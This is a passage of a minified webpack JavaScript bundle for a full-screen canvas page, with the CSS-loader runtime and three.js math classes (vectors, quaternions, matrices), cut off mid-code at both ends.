o=f++;i=p||(p=c(t)),n=u.bind(null,i,o,!1),r=u.bind(null,i,o,!0)}else i=c(t),n=d.bind(null,i,t),r=function(){!function(e){if(null===e.parentNode)return!1;e.parentNode.removeChild(e)}(i)};return n(e),function(t){if(t){if(t.css===e.css&&t.media===e.media&&t.sourceMap===e.sourceMap)return;n(e=t)}else r()}}e.exports=function(e,t,i){return(i=i||{}).singleton||"boolean"==typeof i.singleton||(i.singleton=r()),e=i.base?e+i.base:e,t=t||[],a[e]||(a[e]=[]),s(e,t,i),function(t){if(t=t||[],"[object Array]"===Object.prototype.toString.call(t)){a[e]||(a[e]=[]),s(e,t,i);for(var n=t.length;n<a[e].length;n++)a[e][n]();a[e].length=t.length,0===a[e].length&&delete a[e]}}}},function(e,t,i){(t=i(7)(!1)).push([e.i,"*\n{\n    padding: 0;\n    margin: 0;\n}\n\nbody,\nhtml\n{\n    position: fixed;\n    top: 0;\n    left: 0;\n    width: 100%;\n    height: 100%;\n    overflow: hidden;\n}\n\n.canvas\n{\n    position: fixed;\n    top: 0;\n    left: 0;\n    width: 100%;\n    height: 100%;\n}\n\n.canvas.has-cursor-grab\n{\n    cursor: grab;\n}\n\n.canvas.has-cursor-grabbing\n{\n    cursor: grabbing;\n}\n\n.canvas.has-cursor-pointer\n{\n    cursor: pointer;\n}\n",""]),e.exports=t},function(e,t,i){"use strict";e.exports=function(e){var t=[];return t.toString=function(){return this.map((function(t){var i=function(e,t){var i=e[1]||"",n=e[3];if(!n)return i;if(t&&"function"==typeof btoa){var r=(a=n,s=btoa(unescape(encodeURIComponent(JSON.stringify(a)))),c="sourceMappingURL=data:application/json;charset=utf-8;base64,".concat(s),"/*# ".concat(c," */")),o=n.sources.map((function(e){return"/*# sourceURL=".concat(n.sourceRoot).concat(e," */")}));return[i].concat(o).concat([r]).join("\n")}var a,s,c;return[i].join("\n")}(t,e);return t[2]?"@media ".concat(t[2]," {").concat(i,"}"):i})).join("")},t.i=function(e,i){"string"==typeof e&&(e=[[null,e,""]]);for(var n=0;n<e.length;n++){var r=[].concat(e[n]);i&&(r[2]?r[2]="".concat(i," and ").concat(r[2]):r[2]=i),t.push(r)}},t}},function(e,t){e.exports=function(e){if(!e.webpackPolyfill){var t=Object.create(e);t.children||(t.children=[]),Object.defineProperty(t,"loaded",{enumerable:!0,get:function(){return t.l}}),Object.defineProperty(t,"id",{enumerable:!0,get:function(){return t.i}}),Object.defineProperty(t,"exports",{enumerable:!0}),t.webpackPolyfill=1}return t}},function(e,t,i){"use strict";i.r(t);i(4);void 0===Number.EPSILON&&(Number.EPSILON=Math.pow(2,-52)),void 0===Number.isInteger&&(Number.isInteger=function(e){return"number"==typeof e&&isFinite(e)&&Math.floor(e)===e}),void 0===Math.sign&&(Math.sign=function(e){return e<0?-1:e>0?1:+e}),"name"in Function.prototype==!1&&Object.defineProperty(Function.prototype,"name",{get:function(){return this.toString().match(/^\s*function\s*([^\(\s]*)/)[1]}}),void 0===Object.assign&&(Object.assign=function(e){if(null==e)throw new TypeError("Cannot convert undefined or null to object");for(var t=Object(e),i=1;i<arguments.length;i++){var n=arguments[i];if(null!=n)for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(t[r]=n[r])}return t});var n=0,r=1,o=2,a=0,s=1,c=2,l=3;function h(){}Object.assign(h.prototype,{addEventListener:function(e,t){void 0===this._listeners&&(this._listeners={});var i=this._listeners;void 0===i[e]&&(i[e]=[]),-1===i[e].indexOf(t)&&i[e].push(t)},hasEventListener:function(e,t){if(void 0===this._listeners)return!1;var i=this._listeners;return void 0!==i[e]&&-1!==i[e].indexOf(t)},removeEventListener:function(e,t){if(void 0!==this._listeners){var i=this._listeners[e];if(void 0!==i){var n=i.indexOf(t);-1!==n&&i.splice(n,1)}}},dispatchEvent:function(e){if(void 0!==this._listeners){var t=this._listeners[e.type];if(void 0!==t){e.target=this;for(var i=t.slice(0),n=0,r=i.length;n<r;n++)i[n].call(this,e)}}}});for(var u=[],d=0;d<256;d++)u[d]=(d<16?"0":"")+d.toString(16);var p={DEG2RAD:Math.PI/180,RAD2DEG:180/Math.PI,generateUUID:function(){var e=4294967295*Math.random()|0,t=4294967295*Math.random()|0,i=4294967295*Math.random()|0,n=4294967295*Math.random()|0;return(u[255&e]+u[e>>8&255]+u[e>>16&255]+u[e>>24&255]+"-"+u[255&t]+u[t>>8&255]+"-"+u[t>>16&15|64]+u[t>>24&255]+"-"+u[63&i|128]+u[i>>8&255]+"-"+u[i>>16&255]+u[i>>24&255]+u[255&n]+u[n>>8&255]+u[n>>16&255]+u[n>>24&255]).toUpperCase()},clamp:function(e,t,i){return Math.max(t,Math.min(i,e))},euclideanModulo:function(e,t){return(e%t+t)%t},mapLinear:function(e,t,i,n,r){return n+(e-t)*(r-n)/(i-t)},lerp:function(e,t,i){return(1-i)*e+i*t},smoothstep:function(e,t,i){return e<=t?0:e>=i?1:(e=(e-t)/(i-t))*e*(3-2*e)},smootherstep:function(e,t,i){return e<=t?0:e>=i?1:(e=(e-t)/(i-t))*e*e*(e*(6*e-15)+10)},randInt:function(e,t){return e+Math.floor(Math.random()*(t-e+1))},randFloat:function(e,t){return e+Math.random()*(t-e)},randFloatSpread:function(e){return e*(.5-Math.random())},degToRad:function(e){return e*p.DEG2RAD},radToDeg:function(e){return e*p.RAD2DEG},isPowerOfTwo:function(e){return 0==(e&e-1)&&0!==e},ceilPowerOfTwo:function(e){return Math.pow(2,Math.ceil(Math.log(e)/Math.LN2))},floorPowerOfTwo:function(e){return Math.pow(2,Math.floor(Math.log(e)/Math.LN2))}};function f(e,t){this.x=e||0,this.y=t||0}function m(e,t,i,n){this._x=e||0,this._y=t||0,this._z=i||0,this._w=void 0!==n?n:1}Object.defineProperties(f.prototype,{width:{get:function(){return this.x},set:function(e){this.x=e}},height:{get:function(){return this.y},set:function(e){this.y=e}}}),Object.assign(f.prototype,{isVector2:!0,set:function(e,t){return this.x=e,this.y=t,this},setScalar:function(e){return this.x=e,this.y=e,this},setX:function(e){return this.x=e,this},setY:function(e){return this.y=e,this},setComponent:function(e,t){switch(e){case 0:this.x=t;break;case 1:this.y=t;break;default:throw new Error("index is out of range: "+e)}return this},getComponent:function(e){switch(e){case 0:return this.x;case 1:return this.y;default:throw new Error("index is out of range: "+e)}},clone:function(){return new this.constructor(this.x,this.y)},copy:function(e){return this.x=e.x,this.y=e.y,this},add:function(e,t){return void 0!==t?(console.warn("THREE.Vector2: .add() now only accepts one argument. Use .addVectors( a, b ) instead."),this.addVectors(e,t)):(this.x+=e.x,this.y+=e.y,this)},addScalar:function(e){return this.x+=e,this.y+=e,this},addVectors:function(e,t){return this.x=e.x+t.x,this.y=e.y+t.y,this},addScaledVector:function(e,t){return this.x+=e.x*t,this.y+=e.y*t,this},sub:function(e,t){return void 0!==t?(console.warn("THREE.Vector2: .sub() now only accepts one argument. Use .subVectors( a, b ) instead."),this.subVectors(e,t)):(this.x-=e.x,this.y-=e.y,this)},subScalar:function(e){return this.x-=e,this.y-=e,this},subVectors:function(e,t){return this.x=e.x-t.x,this.y=e.y-t.y,this},multiply:function(e){return this.x*=e.x,this.y*=e.y,this},multiplyScalar:function(e){return this.x*=e,this.y*=e,this},divide:function(e){return this.x/=e.x,this.y/=e.y,this},divideScalar:function(e){return this.multiplyScalar(1/e)},applyMatrix3:function(e){var t=this.x,i=this.y,n=e.elements;return this.x=n[0]*t+n[3]*i+n[6],this.y=n[1]*t+n[4]*i+n[7],this},min:function(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this},max:function(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this},clamp:function(e,t){return this.x=Math.max(e.x,Math.min(t.x,this.x)),this.y=Math.max(e.y,Math.min(t.y,this.y)),this},clampScalar:function(e,t){return this.x=Math.max(e,Math.min(t,this.x)),this.y=Math.max(e,Math.min(t,this.y)),this},clampLength:function(e,t){var i=this.length();return this.divideScalar(i||1).multiplyScalar(Math.max(e,Math.min(t,i)))},floor:function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this},ceil:function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this},round:function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this},roundToZero:function(){return this.x=this.x<0?Math.ceil(this.x):Math.floor(this.x),this.y=this.y<0?Math.ceil(this.y):Math.floor(this.y),this},negate:function(){return this.x=-this.x,this.y=-this.y,this},dot:function(e){return this.x*e.x+this.y*e.y},cross:function(e){return this.x*e.y-this.y*e.x},lengthSq:function(){return this.x*this.x+this.y*this.y},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y)},manhattanLength:function(){return Math.abs(this.x)+Math.abs(this.y)},normalize:function(){return this.divideScalar(this.length()||1)},angle:function(){var e=Math.atan2(this.y,this.x);return e<0&&(e+=2*Math.PI),e},distanceTo:function(e){return Math.sqrt(this.distanceToSquared(e))},distanceToSquared:function(e){var t=this.x-e.x,i=this.y-e.y;return t*t+i*i},manhattanDistanceTo:function(e){return Math.abs(this.x-e.x)+Math.abs(this.y-e.y)},setLength:function(e){return this.normalize().multiplyScalar(e)},lerp:function(e,t){return this.x+=(e.x-this.x)*t,this.y+=(e.y-this.y)*t,this},lerpVectors:function(e,t,i){return this.subVectors(t,e).multiplyScalar(i).add(e)},equals:function(e){return e.x===this.x&&e.y===this.y},fromArray:function(e,t){return void 0===t&&(t=0),this.x=e[t],this.y=e[t+1],this},toArray:function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this.x,e[t+1]=this.y,e},fromBufferAttribute:function(e,t,i){return void 0!==i&&console.warn("THREE.Vector2: offset has been removed from .fromBufferAttribute()."),this.x=e.getX(t),this.y=e.getY(t),this},rotateAround:function(e,t){var i=Math.cos(t),n=Math.sin(t),r=this.x-e.x,o=this.y-e.y;return this.x=r*i-o*n+e.x,this.y=r*n+o*i+e.y,this}}),Object.assign(m,{slerp:function(e,t,i,n){return i.copy(e).slerp(t,n)},slerpFlat:function(e,t,i,n,r,o,a){var s=i[n+0],c=i[n+1],l=i[n+2],h=i[n+3],u=r[o+0],d=r[o+1],p=r[o+2],f=r[o+3];if(h!==f||s!==u||c!==d||l!==p){var m=1-a,v=s*u+c*d+l*p+h*f,g=v>=0?1:-1,y=1-v*v;if(y>Number.EPSILON){var b=Math.sqrt(y),w=Math.atan2(b,v*g);m=Math.sin(m*w)/b,a=Math.sin(a*w)/b}var x=a*g;if(s=s*m+u*x,c=c*m+d*x,l=l*m+p*x,h=h*m+f*x,m===1-a){var _=1/Math.sqrt(s*s+c*c+l*l+h*h);s*=_,c*=_,l*=_,h*=_}}e[t]=s,e[t+1]=c,e[t+2]=l,e[t+3]=h}}),Object.defineProperties(m.prototype,{x:{get:function(){return this._x},set:function(e){this._x=e,this._onChangeCallback()}},y:{get:function(){return this._y},set:function(e){this._y=e,this._onChangeCallback()}},z:{get:function(){return this._z},set:function(e){this._z=e,this._onChangeCallback()}},w:{get:function(){return this._w},set:function(e){this._w=e,this._onChangeCallback()}}}),Object.assign(m.prototype,{isQuaternion:!0,set:function(e,t,i,n){return this._x=e,this._y=t,this._z=i,this._w=n,this._onChangeCallback(),this},clone:function(){return new this.constructor(this._x,this._y,this._z,this._w)},copy:function(e){return this._x=e.x,this._y=e.y,this._z=e.z,this._w=e.w,this._onChangeCallback(),this},setFromEuler:function(e,t){if(!e||!e.isEuler)throw new Error("THREE.Quaternion: .setFromEuler() now expects an Euler rotation rather than a Vector3 and order.");var i=e._x,n=e._y,r=e._z,o=e.order,a=Math.cos,s=Math.sin,c=a(i/2),l=a(n/2),h=a(r/2),u=s(i/2),d=s(n/2),p=s(r/2);return"XYZ"===o?(this._x=u*l*h+c*d*p,this._y=c*d*h-u*l*p,this._z=c*l*p+u*d*h,this._w=c*l*h-u*d*p):"YXZ"===o?(this._x=u*l*h+c*d*p,this._y=c*d*h-u*l*p,this._z=c*l*p-u*d*h,this._w=c*l*h+u*d*p):"ZXY"===o?(this._x=u*l*h-c*d*p,this._y=c*d*h+u*l*p,this._z=c*l*p+u*d*h,this._w=c*l*h-u*d*p):"ZYX"===o?(this._x=u*l*h-c*d*p,this._y=c*d*h+u*l*p,this._z=c*l*p-u*d*h,this._w=c*l*h+u*d*p):"YZX"===o?(this._x=u*l*h+c*d*p,this._y=c*d*h+u*l*p,this._z=c*l*p-u*d*h,this._w=c*l*h-u*d*p):"XZY"===o&&(this._x=u*l*h-c*d*p,this._y=c*d*h-u*l*p,this._z=c*l*p+u*d*h,this._w=c*l*h+u*d*p),!1!==t&&this._onChangeCallback(),this},setFromAxisAngle:function(e,t){var i=t/2,n=Math.sin(i);return this._x=e.x*n,this._y=e.y*n,this._z=e.z*n,this._w=Math.cos(i),this._onChangeCallback(),this},setFromRotationMatrix:function(e){var t,i=e.elements,n=i[0],r=i[4],o=i[8],a=i[1],s=i[5],c=i[9],l=i[2],h=i[6],u=i[10],d=n+s+u;return d>0?(t=.5/Math.sqrt(d+1),this._w=.25/t,this._x=(h-c)*t,this._y=(o-l)*t,this._z=(a-r)*t):n>s&&n>u?(t=2*Math.sqrt(1+n-s-u),this._w=(h-c)/t,this._x=.25*t,this._y=(r+a)/t,this._z=(o+l)/t):s>u?(t=2*Math.sqrt(1+s-n-u),this._w=(o-l)/t,this._x=(r+a)/t,this._y=.25*t,this._z=(c+h)/t):(t=2*Math.sqrt(1+u-n-s),this._w=(a-r)/t,this._x=(o+l)/t,this._y=(c+h)/t,this._z=.25*t),this._onChangeCallback(),this},setFromUnitVectors:function(e,t){var i=e.dot(t)+1;return i<1e-6?(i=0,Math.abs(e.x)>Math.abs(e.z)?(this._x=-e.y,this._y=e.x,this._z=0,this._w=i):(this._x=0,this._y=-e.z,this._z=e.y,this._w=i)):(this._x=e.y*t.z-e.z*t.y,this._y=e.z*t.x-e.x*t.z,this._z=e.x*t.y-e.y*t.x,this._w=i),this.normalize()},angleTo:function(e){return 2*Math.acos(Math.abs(p.clamp(this.dot(e),-1,1)))},rotateTowards:function(e,t){var i=this.angleTo(e);if(0===i)return this;var n=Math.min(1,t/i);return this.slerp(e,n),this},inverse:function(){return this.conjugate()},conjugate:function(){return this._x*=-1,this._y*=-1,this._z*=-1,this._onChangeCallback(),this},dot:function(e){return this._x*e._x+this._y*e._y+this._z*e._z+this._w*e._w},lengthSq:function(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w},length:function(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)},normalize:function(){var e=this.length();return 0===e?(this._x=0,this._y=0,this._z=0,this._w=1):(e=1/e,this._x=this._x*e,this._y=this._y*e,this._z=this._z*e,this._w=this._w*e),this._onChangeCallback(),this},multiply:function(e,t){return void 0!==t?(console.warn("THREE.Quaternion: .multiply() now only accepts one argument. Use .multiplyQuaternions( a, b ) instead."),this.multiplyQuaternions(e,t)):this.multiplyQuaternions(this,e)},premultiply:function(e){return this.multiplyQuaternions(e,this)},multiplyQuaternions:function(e,t){var i=e._x,n=e._y,r=e._z,o=e._w,a=t._x,s=t._y,c=t._z,l=t._w;return this._x=i*l+o*a+n*c-r*s,this._y=n*l+o*s+r*a-i*c,this._z=r*l+o*c+i*s-n*a,this._w=o*l-i*a-n*s-r*c,this._onChangeCallback(),this},slerp:function(e,t){if(0===t)return this;if(1===t)return this.copy(e);var i=this._x,n=this._y,r=this._z,o=this._w,a=o*e._w+i*e._x+n*e._y+r*e._z;if(a<0?(this._w=-e._w,this._x=-e._x,this._y=-e._y,this._z=-e._z,a=-a):this.copy(e),a>=1)return this._w=o,this._x=i,this._y=n,this._z=r,this;var s=1-a*a;if(s<=Number.EPSILON){var c=1-t;return this._w=c*o+t*this._w,this._x=c*i+t*this._x,this._y=c*n+t*this._y,this._z=c*r+t*this._z,this.normalize(),this._onChangeCallback(),this}var l=Math.sqrt(s),h=Math.atan2(l,a),u=Math.sin((1-t)*h)/l,d=Math.sin(t*h)/l;return this._w=o*u+this._w*d,this._x=i*u+this._x*d,this._y=n*u+this._y*d,this._z=r*u+this._z*d,this._onChangeCallback(),this},equals:function(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._w===this._w},fromArray:function(e,t){return void 0===t&&(t=0),this._x=e[t],this._y=e[t+1],this._z=e[t+2],this._w=e[t+3],this._onChangeCallback(),this},toArray:function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this._x,e[t+1]=this._y,e[t+2]=this._z,e[t+3]=this._w,e},_onChange:function(e){return this._onChangeCallback=e,this},_onChangeCallback:function(){}});var v=new y,g=new m;function y(e,t,i){this.x=e||0,this.y=t||0,this.z=i||0}Object.assign(y.prototype,{isVector3:!0,set:function(e,t,i){return this.x=e,this.y=t,this.z=i,this},setScalar:function(e){return this.x=e,this.y=e,this.z=e,this},setX:function(e){return this.x=e,this},setY:function(e){return this.y=e,this},setZ:function(e){return this.z=e,this},setComponent:function(e,t){switch(e){case 0:this.x=t;break;case 1:this.y=t;break;case 2:this.z=t;break;default:throw new Error("index is out of range: "+e)}return this},getComponent:function(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;default:throw new Error("index is out of range: "+e)}},clone:function(){return new this.constructor(this.x,this.y,this.z)},copy:function(e){return this.x=e.x,this.y=e.y,this.z=e.z,this},add:function(e,t){return void 0!==t?(console.warn("THREE.Vector3: .add() now only accepts one argument. Use .addVectors( a, b ) instead."),this.addVectors(e,t)):(this.x+=e.x,this.y+=e.y,this.z+=e.z,this)},addScalar:function(e){return this.x+=e,this.y+=e,this.z+=e,this},addVectors:function(e,t){return this.x=e.x+t.x,this.y=e.y+t.y,this.z=e.z+t.z,this},addScaledVector:function(e,t){return this.x+=e.x*t,this.y+=e.y*t,this.z+=e.z*t,this},sub:function(e,t){return void 0!==t?(console.warn("THREE.Vector3: .sub() now only accepts one argument. Use .subVectors( a, b ) instead."),this.subVectors(e,t)):(this.x-=e.x,this.y-=e.y,this.z-=e.z,this)},subScalar:function(e){return this.x-=e,this.y-=e,this.z-=e,this},subVectors:function(e,t){return this.x=e.x-t.x,this.y=e.y-t.y,this.z=e.z-t.z,this},multiply:function(e,t){return void 0!==t?(console.warn("THREE.Vector3: .multiply() now only accepts one argument. Use .multiplyVectors( a, b ) instead."),this.multiplyVectors(e,t)):(this.x*=e.x,this.y*=e.y,this.z*=e.z,this)},multiplyScalar:function(e){return this.x*=e,this.y*=e,this.z*=e,this},multiplyVectors:function(e,t){return this.x=e.x*t.x,this.y=e.y*t.y,this.z=e.z*t.z,this},applyEuler:function(e){return e&&e.isEuler||console.error("THREE.Vector3: .applyEuler() now expects an Euler rotation rather than a Vector3 and order."),this.applyQuaternion(g.setFromEuler(e))},applyAxisAngle:function(e,t){return this.applyQuaternion(g.setFromAxisAngle(e,t))},applyMatrix3:function(e){var t=this.x,i=this.y,n=this.z,r=e.elements;return this.x=r[0]*t+r[3]*i+r[6]*n,this.y=r[1]*t+r[4]*i+r[7]*n,this.z=r[2]*t+r[5]*i+r[8]*n,this},applyMatrix4:function(e){var t=this.x,i=this.y,n=this.z,r=e.elements,o=1/(r[3]*t+r[7]*i+r[11]*n+r[15]);return this.x=(r[0]*t+r[4]*i+r[8]*n+r[12])*o,this.y=(r[1]*t+r[5]*i+r[9]*n+r[13])*o,this.z=(r[2]*t+r[6]*i+r[10]*n+r[14])*o,this},applyQuaternion:function(e){var t=this.x,i=this.y,n=this.z,r=e.x,o=e.y,a=e.z,s=e.w,c=s*t+o*n-a*i,l=s*i+a*t-r*n,h=s*n+r*i-o*t,u=-r*t-o*i-a*n;return this.x=c*s+u*-r+l*-a-h*-o,this.y=l*s+u*-o+h*-r-c*-a,this.z=h*s+u*-a+c*-o-l*-r,this},project:function(e){return this.applyMatrix4(e.matrixWorldInverse).applyMatrix4(e.projectionMatrix)},unproject:function(e){return this.applyMatrix4(e.projectionMatrixInverse).applyMatrix4(e.matrixWorld)},transformDirection:function(e){var t=this.x,i=this.y,n=this.z,r=e.elements;return this.x=r[0]*t+r[4]*i+r[8]*n,this.y=r[1]*t+r[5]*i+r[9]*n,this.z=r[2]*t+r[6]*i+r[10]*n,this.normalize()},divide:function(e){return this.x/=e.x,this.y/=e.y,this.z/=e.z,this},divideScalar:function(e){return this.multiplyScalar(1/e)},min:function(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this.z=Math.min(this.z,e.z),this},max:function(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this.z=Math.max(this.z,e.z),this},clamp:function(e,t){return this.x=Math.max(e.x,Math.min(t.x,this.x)),this.y=Math.max(e.y,Math.min(t.y,this.y)),this.z=Math.max(e.z,Math.min(t.z,this.z)),this},clampScalar:function(e,t){return this.x=Math.max(e,Math.min(t,this.x)),this.y=Math.max(e,Math.min(t,this.y)),this.z=Math.max(e,Math.min(t,this.z)),this},clampLength:function(e,t){var i=this.length();return this.divideScalar(i||1).multiplyScalar(Math.max(e,Math.min(t,i)))},floor:function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this},ceil:function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this},round:function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this},roundToZero:function(){return this.x=this.x<0?Math.ceil(this.x):Math.floor(this.x),this.y=this.y<0?Math.ceil(this.y):Math.floor(this.y),this.z=this.z<0?Math.ceil(this.z):Math.floor(this.z),this},negate:function(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this},dot:function(e){return this.x*e.x+this.y*e.y+this.z*e.z},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)},manhattanLength:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)},normalize:function(){return this.divideScalar(this.length()||1)},setLength:function(e){return this.normalize().multiplyScalar(e)},lerp:function(e,t){return this.x+=(e.x-this.x)*t,this.y+=(e.y-this.y)*t,this.z+=(e.z-this.z)*t,this},lerpVectors:function(e,t,i){return this.subVectors(t,e).multiplyScalar(i).add(e)},cross:function(e,t){return void 0!==t?(console.warn("THREE.Vector3: .cross() now only accepts one argument. Use .crossVectors( a, b ) instead."),this.crossVectors(e,t)):this.crossVectors(this,e)},crossVectors:function(e,t){var i=e.x,n=e.y,r=e.z,o=t.x,a=t.y,s=t.z;return this.x=n*s-r*a,this.y=r*o-i*s,this.z=i*a-n*o,this},projectOnVector:function(e){var t=e.dot(this)/e.lengthSq();return this.copy(e).multiplyScalar(t)},projectOnPlane:function(e){return v.copy(this).projectOnVector(e),this.sub(v)},reflect:function(e){return this.sub(v.copy(e).multiplyScalar(2*this.dot(e)))},angleTo:function(e){var t=Math.sqrt(this.lengthSq()*e.lengthSq());0===t&&console.error("THREE.Vector3: angleTo() can't handle zero length vectors.");var i=this.dot(e)/t;return Math.acos(p.clamp(i,-1,1))},distanceTo:function(e){return Math.sqrt(this.distanceToSquared(e))},distanceToSquared:function(e){var t=this.x-e.x,i=this.y-e.y,n=this.z-e.z;return t*t+i*i+n*n},manhattanDistanceTo:function(e){return Math.abs(this.x-e.x)+Math.abs(this.y-e.y)+Math.abs(this.z-e.z)},setFromSpherical:function(e){return this.setFromSphericalCoords(e.radius,e.phi,e.theta)},setFromSphericalCoords:function(e,t,i){var n=Math.sin(t)*e;return this.x=n*Math.sin(i),this.y=Math.cos(t)*e,this.z=n*Math.cos(i),this},setFromCylindrical:function(e){return this.setFromCylindricalCoords(e.radius,e.theta,e.y)},setFromCylindricalCoords:function(e,t,i){return this.x=e*Math.sin(t),this.y=i,this.z=e*Math.cos(t),this},setFromMatrixPosition:function(e){var t=e.elements;return this.x=t[12],this.y=t[13],this.z=t[14],this},setFromMatrixScale:function(e){var t=this.setFromMatrixColumn(e,0).length(),i=this.setFromMatrixColumn(e,1).length(),n=this.setFromMatrixColumn(e,2).length();return this.x=t,this.y=i,this.z=n,this},setFromMatrixColumn:function(e,t){return this.fromArray(e.elements,4*t)},equals:function(e){return e.x===this.x&&e.y===this.y&&e.z===this.z},fromArray:function(e,t){return void 0===t&&(t=0),this.x=e[t],this.y=e[t+1],this.z=e[t+2],this},toArray:function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this.x,e[t+1]=this.y,e[t+2]=this.z,e},fromBufferAttribute:function(e,t,i){return void 0!==i&&console.warn("THREE.Vector3: offset has been removed from .fromBufferAttribute()."),this.x=e.getX(t),this.y=e.getY(t),this.z=e.getZ(t),this}});var b,w=new y;function x(){this.elements=[1,0,0,0,1,0,0,0,1],arguments.length>0&&console.error("THREE.Matrix3: the constructor no longer reads arguments. use .set() instead.")}Object.assign(x.prototype,{isMatrix3:!0,set:function(e,t,i,n,r,o,a,s,c){var l=this.elements;return l[0]=e,l[1]=n,l[2]=a,l[3]=t,l[4]=r,l[5]=s,l[6]=i,l[7]=o,l[8]=c,this},identity:function(){return this.set(1,0,0,0,1,0,0,0,1),this},clone:function(){return(new this.constructor).fromArray(this.elements)},copy:function(e){var t=this.elements,i=e.elements;return t[0]=i[0],t[1]=i[1],t[2]=i[2],t[3]=i[3],t[4]=i[4],t[5]=i[5],t[6]=i[6],t[7]=i[7],t[8]=i[8],this},setFromMatrix4:function(e){var t=e.elements;return this.set(t[0],t[4],t[8],t[1],t[5],t[9],t[2],t[6],t[10]),this},applyToBufferAttribute:function(e){for(var t=0,i=e.count;t<i;t++)w.x=e.getX(t),w.y=e.getY(t),w.z=e.getZ(t),w.applyMatrix3(this),e.setXYZ(t,w.x,w.y,w.z);return e},multiply:function(e){return this.multiplyMatrices(this,e)},premultiply:function(e){return this.multiplyMatrices(e,this)},multiplyMatrices:function(e,t){var i=e.elements,n=t.elements,r=this.elements,o=i[0],a=i[3],s=i[6],c=i[1],l=i[4],h=i[7],u=i[2],d=i[5],p=i[8],f=n[0],m=n[3],v=n[6],g=n[1],y=n[4],b=n[7],w=n[2],x=n[5],_=n[8];return r[0]=o*f+a*g+s*w,r[3]=o*m+a*y+s*x,r[6]=o*v+a*b+s*_,r[1]=c*f+l*g+h*w,r[4]=c*m+l*y+h*x,r[7]=c*v+l*b+h*_,r[2]=u*f+d*g+p*w,r[5]=u*m+d*y+p*x,r[8]=u*v+d*b+p*_,this},multiplyScalar:function(e){var t=this.elements;return t[0]*=e,t[3]*=e,t[6]*=e,t[1]*=e,t[4]*=e,t[7]*=e,t[2]*=e,t[5]*=e,t[8]*=e,this},determinant:function(){var e=this.elements,t=e[0],i=e[1],n=e[2],r=e[3],o=e[4],a=e[5],s=e[6],c=e[7],l=e[8];return t*o*l-t*a*c-i*r*l+i*a*s+n*r*c-n*o*s},getInverse:function(e,t){e&&e.isMatrix4&&console.error("THREE.Matrix3: .getInverse() no longer takes a Matrix4 argument.");var i=e.elements,n=this.elements,r=i[0],o=i[1],a=i[2],s=i[3],c=i[4],l=i[5],h=i[6],u=i[7],d=i[8],p=d*c-l*u,f=l*h-d*s,m=u*s-c*h,v=r*p+o*f+a*m;if(0===v){var g="THREE.Matrix3: .getInverse() can't invert matrix, determinant is 0";if(!0===t)throw new Error(g);return console.warn(g),this.identity()}var y=1/v;return n[0]=p*y,n[1]=(a*u-d*o)*y,n[2]=(l*o-a*c)*y,n[3]=f*y,n[4]=(d*r-a*h)*y,n[5]=(a*s-l*r)*y,n[6]=m*y,n[7]=(o*h-u*r)*y,n[8]=(c*r-o*s)*y,this},transpose:function(){var e,t=this.elements;return e=t[1],t[1]=t[3],t[3]=e,e=t[2],t[2]=t[6],t[6]=e,e=t[5],t[5]=t[7],t[7]=e,this},getNormalMatrix:function(e){return this.setFromMatrix4(e).getInverse(this).transpose()},transposeIntoArray:function(e){var t=this.elements;return e[0]=t[0],e[1]=t[3],e[2]=t[6],e[3]=t[1],e[4]=t[4],e[5]=t[7],e[6]=t[2],e[7]=t[5],e[8]=t[8],this},setUvTransform:function(e,t,i,n,r,o,a){var s=Math.cos(r),c=Math.sin(r);this.set(i*s,i*c,-i*(s*o+c*a)+o+e,-n*c,n*s,-n*(-c*o+s*a)+a+t,0,0,1)},scale:function(e,t){var i=this.elements;return i[0]*=e,i[3]*=e,i[6]*=e,i[1]*=t,i[4]*=t,i[7]*=t,this},rotate:function(e){var t=Math.cos(e),i=Math.sin(e),n=this.elements,r=n[0],o=n[3],a=n[6],s=n[1],c=n[4],l=n[7];return n[0]=t*r+i*s,n[3]=t*o+i*c,n[6]=t*a+i*l,n[1]=-i*r+t*s,n[4]=-i*o+t*c,n[7]=-i*a+t*l,this},translate:function(e,t){var i=this.elements;return i[0]+=e*i[2],i[3]+=e*i[5],i[6]+=e*i[8],i[1]+=t*i[2],i[4]+=t*i[5],i[7]+=t*i[8],this},equals:function(e){for(var t=this.elements,i=e.elements,n=0;n<9;n++)if(t[n]!==i[n])return!1;return!0},fromArray:function(e,t){void 0===t&&(t=0);for(var i=0;i<9;i++)this.elements[i]=e[i+t];return this},toArray:function(e,t){void 0===e&&(e=[]),void 0===t&&(t=0);var i=this.elements;return e[t]=i[0],e[t+1]=i[1],e[t+2]=i[2],e[t+3]=i[3],e[t+4]=i[4],e[t+5]=i[5],e[t+6]=i[6],e[t+7]=i[7],e[t+8]=i[8],e}});var _={getDataURL:function(e){var t;if("undefined"==typeof HTMLCanvasElement)return e.src;if(e instanceof HTMLCanvasElement)t=e;else{void 0===b&&(b=document.createElementNS("http://www.w3.org/1999/xhtml","canvas")),b.width=e.width,b.height=e.height;var i=b.getContext("2d");e instanceof ImageData?i.putImageData(e,0,0):i.drawImage(e,0,0,e.width,e.height),t=b}return 